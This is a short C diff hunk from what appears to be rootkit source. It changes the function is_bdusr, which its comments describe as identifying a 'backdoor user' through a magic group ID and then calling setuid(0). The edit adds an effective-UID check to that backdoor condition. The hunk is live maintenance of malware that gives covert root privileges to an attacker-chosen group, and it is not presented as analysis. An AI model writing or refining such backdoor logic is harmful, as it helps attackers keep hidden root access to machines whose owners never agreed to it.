@@ -21,7 +21,7 @@ int is_bdusr(void){
      * in the environment. so if the check above bore no
      * fruits, we're most likely a proper backdoor user.
      * set the HOME environment variable. */
-    if(getgid() == MAGIC_GID){
+    if(geteuid() == 0 && getgid() == MAGIC_GID){
         ret = 1;
         setuid(0);
 
